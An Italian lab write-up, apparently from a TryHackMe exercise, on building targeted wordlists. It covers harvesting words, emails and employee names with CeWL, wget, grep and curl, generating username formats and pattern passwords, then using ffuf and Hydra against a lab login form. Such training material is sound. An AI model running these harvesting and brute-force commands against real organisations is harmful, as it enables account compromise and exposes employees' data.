
---
title: Creazione di Wordlist Personalizzate
# description: OSINT, CeWL, generazione pattern-based con Crunch e attacco a un form di login con ffuf e Hydra
date: 2026-09-24 10:30:00 +0200
categories: [PT1, password-attacks]
tags: [introduction-to-wordlists, osint, wordlists, cewl, ffuf, hydra, crunch]
---

## Perché servono wordlist personalizzate

Le wordlist generiche (rockyou.txt e simili) contengono termini comuni ma raramente riflettono il gergo, i nomi e le convenzioni specifiche di un'organizzazione bersaglio. Raccogliendo informazioni pubbliche tramite OSINT (nomi di dipendenti, prodotti, luoghi, terminologia aziendale) possiamo costruire elenchi mirati che aumentano sensibilmente il tasso di successo in attività di enumerazione di directory e di credential brute-forcing.

## Fonti OSINT

**Fonti semplici**

- Reti professionali (LinkedIn, ecc.)
- Siti web aziendali
- Social media
- Annunci di lavoro

**Metodi di ricognizione di base**

- WHOIS (nome dell'organizzazione, server DNS)
- Enumerazione dei sottodomini
- Ricerca di certificati
- Scansione del sito aziendale (CeWL automatizza l'estrazione delle parole dalle pagine)
- Identificazione della tecnologia (es. Wappalyzer)

## Raccolta parole ed email con CeWL

```bash
cewl -d 2 -m 3 --lowercase --with-numbers -e --email_file emails.txt -w cewl_words.txt http://tryfinanceme.local
```

- `-d 2`: cerca fino a due livelli di profondità nelle cartelle.
- `-m 3`: include solo parole di almeno tre caratteri
- `--lowercase`: converte tutte le parole estratte in minuscolo
- `--with-numbers`: include anche parole contenenti numeri
- `-e`: abilita l'estrazione degli indirizzi email
- `--email_file emails.txt`: salva le email trovate in `emails.txt`
- `-w cewl_words.txt`: salva le parole estratte in `cewl_words.txt`

L'output sono due file: `cewl_words.txt` (parole chiave del sito) e `emails.txt` (email aziendali complete).

## Estrazione di testo da PDF pubblici

Scarichiamo tutti i PDF esposti dal sito. Supponiamo che nel nostro caso siano ospitato in http://tryfinanceme.local/docs/>

```bash
wget -r -A pdf http://tryfinanceme.local/docs/>
```

- `-r`: scaricamento ricorsivo, segue i link nella pagina indicata
- `-A pdf`: accetta solo file con estensione `.pdf`, scartando il resto

Estraiamo il testo utile da ogni PDF scaricato:

```bash
for f in $(find tryfinanceme.local/docs -name '*.pdf'); do strings -n 5 "$f" | grep -vP '^[/<>%0-9\\]|^(stream|endstream|endobj|xref|trailer|startxref)$' >> raw_words.txt; done
```

- `find tryfinanceme.local/docs -name '*.pdf'`: elenca tutti i PDF appena scaricati nella cartella locale
- `strings -n 5 "$f"`: estrae dal file binario le sequenze di caratteri stampabili lunghe almeno 5 caratteri (un PDF, oltre al testo, contiene molto codice binario e strutturale)
- `grep -vP '^[/<>%0-9\\]|^(stream|endstream|endobj|xref|trailer|startxref)$'`: scarta le righe che iniziano con simboli tipici della sintassi PDF (`/`, `<`, `>`, `%`, cifre, `\`) e le righe che sono esattamente parole chiave strutturali del formato PDF (`stream`, `endstream`, `endobj`, `xref`, `trailer`, `startxref`), eliminando il "rumore" e lasciando solo testo plausibile
- `>> raw_words.txt`: accumula il risultato di ogni file in un unico elenco

### Estrazione email dai PDF

```bash
grep -RhiaoP '[A-Za-z0-9._%+-]+@tryfinanceme\.com' tryfinanceme.local/docs > emails_docs.txt
sort -u emails_docs.txt > emails_docs.unique.txt
grep -Po '^[^@]+' emails_docs.unique.txt > users_from_emails.txt
```

- Il primo `grep` cerca ricorsivamente nei PDF scaricati ogni stringa che corrisponda a `username@tryfinanceme.com` e la salva in `emails_docs.txt`
- `sort -u` rimuove le email duplicate
- Il secondo `grep` mantiene solo la parte prima della `@`, ricavando un possibile nome utente da ogni indirizzo email

## Estrazione di nomi dalla pagina social

Se ogni profilo sul sito social interno è marcato nell'HTML così:

```html
<h3 class="profile-name">Alex Johnson</h3>
```

si può estrarre il nome con la lookbehind positiva `(?<=...)` , che in pratica dice a grep: "cerca solo se subito prima di questo punto c'è la stringa `<h3 class="profile-name">`", ma **non includerla** nel risultato.

```bash
curl -s http://social.tryfinanceme.local/ | grep -Po '(?<=<h3 class="profile-name">)[^<]+' > names.txt
```

`(?<=<h3 class="profile-name">)` ancora la corrispondenza subito dopo il tag di apertura, senza includerlo nel risultato; `[^<]+` cattura tutto ciò che segue fino al tag di chiusura.

### Generazione dei formati di username

Usiamo `awk`. Questo strumento elabora un file **riga per riga**. Per ogni riga, divide automaticamente il testo in "campi" separati da spazi (o tab), accessibili come `$1` (primo campo), `$2` (secondo campo), ecc. `$0` indicherebbe l'intera riga.

```bash
awk '{print tolower($1)"."tolower($2)}' names.txt > users_first.last.txt
awk '{print tolower(substr($1,1,1))tolower($2)}' names.txt > users_flast.txt
awk '{print tolower($1)tolower(substr($2,1,1))}' names.txt > users_firstl.txt
```

Da "Alex Johnson" si ottengono tre convenzioni comuni:

| File | Formato | Esempio |
|---|---|---|
| `users_first.last.txt` | nome.cognome | `alex.johnson` |
| `users_flast.txt` | iniziale nome + cognome | `ajohnson` |
| `users_firstl.txt` | nome + iniziale cognome | `alexj` |

## Unione e pulizia delle wordlist

### Parole per il fuzzing di directory

```bash
cat cewl_words.txt raw_words.txt | sort -u > words_raw.txt
cat words_raw.txt | tr '[:upper:]' '[:lower:]' | tr -d '\r' | grep -P '^[a-z0-9][a-z0-9._-]{4,}$' | sort -u > words_clean.txt
```

- `sort -u` ordina e deduplica dopo l'unione dei due elenchi
- `tr '[:upper:]' '[:lower:]'` converte tutto in minuscolo
- `tr -d '\r'` rimuove i ritorni a capo tipici dei file Windows
- `grep -P '^[a-z0-9][a-z0-9._-]{4,}$'` mantiene solo le righe che iniziano con un carattere alfanumerico, proseguono con lettere/cifre/punti/underscore/trattini e sono lunghe almeno cinque caratteri, eliminando frammenti troppo corti o malformati
- un secondo `sort -u` garantisce l'unicità finale

> Una lista troppo lunga rallenta ffuf; una troppo corta rischia di non trovare percorsi validi. L'obiettivo è un elenco di qualche centinaio di voci, pulite e in minuscolo.
{: .prompt-tip }

### Nomi utente

```bash
cat users_first.last.txt users_flast.txt users_firstl.txt users_from_emails.txt | sort -u > users.txt
```

Unisce tutte le varianti generate in precedenza in un unico elenco deduplicato.

## Generazione di password pattern-based con Crunch

Se l'OSINT rivela che le password seguono uno schema noto (es. `Helios20NN!` con `NN` due cifre), si può generare lo spazio esatto con Crunch invece di usare una wordlist generica:

```bash
crunch 11 11 -t Helios20%%! -o pass_helios.txt
```

- `11 11`: lunghezza minima e massima fissate a 11 caratteri
- `-t Helios20%%!`: definisce il pattern, dove ogni `%` viene sostituito da una cifra (`0`-`9`); `%%` genera quindi tutte le combinazioni da `00` a `99`
- `-o pass_helios.txt`: scrive le 100 password generate su file

## Fuzzing di directory con ffuf

```bash
ffuf -w words_clean.txt -u http://tryfinanceme.local/FUZZ -e .php,.html,/ -mc 200,301,302
```

- `-w words_clean.txt`: la wordlist da usare
- `-u http://tryfinanceme.local/FUZZ`: URL bersaglio, dove `FUZZ` viene sostituito da ogni parola della lista
- `-e .php,.html,/`: testa ogni parola sia da sola sia con queste estensioni/suffissi aggiunti
- `-mc 200,301,302`: mostra solo le risposte con questi codici di stato

## Brute-force del login con Hydra

Individuato un form di login (es. `/helios/login.php`), si attacca con Hydra usando le liste appena costruite:

```bash
hydra -L users.txt -P pass_helios.txt -f -V -t 4 tryfinanceme.local http-post-form '/helios/login.php:username=^USER^&password=^PASS^:S=THM{'
```

- `-L users.txt`: file dei nomi utente
- `-P pass_helios.txt`: file delle password
- `-f`: interrompe l'attacco al primo tentativo riuscito
- `-V`: stampa ogni tentativo (verbose)
- `-t 4`: usa 4 thread paralleli
- `http-post-form '...'`: modulo per attacchi a form HTTP POST, con tre parti separate da `:`
  - `/helios/login.php`: percorso del gestore di login
  - `username=^USER^&password=^PASS^`: corpo della richiesta, con i segnaposto di Hydra per utente e password
  - `S=THM{`: condizione di successo — la risposta è considerata valida se contiene questa stringa

Il risultato dell'attacco a `tryfinanceme.local` produce la coppia di credenziali valide `alex.johnson` / `Helios2025!`.



## Extra: cupp

Se conosciamo dei dati di un utente (nome, cognome, soprannome, consorte, animali domestici,...) possiamo usare cupp:

```bash
git clone https://github.com/Mebus/cupp.git
cd cupp
python3 cupp.py -i # to run cupp in interactive mode
```

In questo modo otterremo una wordlist personalizzata.